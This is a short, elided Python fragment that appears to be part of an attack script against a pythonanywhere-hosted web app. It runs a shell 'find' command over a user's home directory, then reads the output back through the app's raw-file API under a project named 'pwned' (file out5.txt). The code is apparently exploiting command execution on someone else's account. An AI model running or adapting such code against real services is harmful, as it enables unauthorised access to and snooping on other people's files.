...
try:
    out = subprocess.check_output("find /home/MikeyMike -name 'agy' 2>/dev/null", shell=True)
...
time.sleep(3)
r3 = s.get('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/get_raw_file?project=pwned&file=out5.txt')
print(r3.text)
